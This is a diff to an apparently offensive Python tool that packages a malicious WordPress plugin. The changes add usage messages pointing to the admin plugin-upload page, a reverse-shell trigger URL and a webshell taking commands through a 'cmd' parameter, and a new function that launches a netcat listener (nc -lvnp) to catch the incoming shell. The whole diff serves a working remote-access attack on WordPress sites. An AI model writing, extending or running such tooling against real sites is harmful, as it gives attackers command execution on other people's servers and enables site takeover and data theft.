@@ -13,8 +13,10 @@
 #                   without using metasploit
 #
 import argparse
+import sys
 import os
 import zipfile
+import subprocess
 from pathlib import Path
 from random import randint 
 
@@ -244,13 +246,26 @@ def createplugin(args):
     os.system("rm -rf temp")
     # Useful Info
     print("[+] URL to upload the plugin: http://(target)/wp-admin/plugin-install.php?tab=upload")
-    print("[+] How to trigger the reverse shell : ")
+    print("[+] How to trigger the reverse shell: ")
     print("      ->   http://(target)/wp-content/plugins/malicious/RemoteModule.php")
+    print("[+] Webshell will be here with variable cmd: ")
     print("      ->   http://(target)/wp-content/plugins/malicious/WebModule.php?cmd=ls")
 
 
+def listneroption(args):
+    """function to spawn a listner if wanted.
+
+    :param args: arguments parsed
+    """
+    if args.listner:
+        print(f"[+] Netcat listner will be started at port {args.port}\n")
+        subprocess.run(f"nc -lvnp {args.port}", shell=True)
+        os._exit(0)
 
 if __name__ == "__main__":
     args = parseargs()
     prepareplugin(args)
     createplugin(args)
+    listneroption(args)
+
+
